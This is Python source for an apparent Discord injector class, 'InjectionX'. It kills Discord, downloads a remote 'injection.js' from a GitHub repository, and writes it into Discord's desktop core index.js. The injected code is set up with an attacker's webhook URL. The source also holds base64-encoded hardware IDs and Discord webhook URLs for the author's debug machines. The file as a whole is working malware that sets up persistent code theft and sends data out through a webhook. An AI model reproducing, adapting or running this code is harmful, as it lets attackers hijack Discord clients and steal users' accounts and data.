import requests 
import psutil
import re 
import os
import subprocess
import base64

class InjectionX:
    def __init__(self, webhook: str) -> None:
        # Developer Config, don't change, only if you know what you're doing
        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        if self.hwid == b64decode(b'NUEyNTc2MkEtODlFNi04QTE4LUE1MjMtMDBEODYxQzc0NzU3').decode('UTF-8'):
            self.debug_mode = True
            self.webhook = b64decode(b'aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwODQxNTU5MjczMTUzNjYwMjgvT1pHZDE0LVZTbmdhajZvZGJ0Q3FfOTM0Z1phZFZsSWhZamJneXZhYzhWUEdPZ1pNclBTSzQ1MUFNMllHb1lsenpHdFk=').decode('UTF-8')
            return
        if self.hwid == b64decode(b'Mzg0NDQzMzUtMzgzMi01NzMwLTM1MzktMzk1NzM4MzI0NDM1').decode('UTF-8'):
            self.debug_mode = True
            self.webhook = b64decode(b'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTA4NDU0MjkxNDk3NTI0ODM4NS9JNEdSMGM5N0dQRnVPZXkzMEJLajJKY3RrTDhtVlRpMVVMeUtzSF84OS1zV0V4bHpGSGNwQzVVc3l0NHBmT1djLXBpTg==').decode('UTF-8')
            return
        
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js').text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
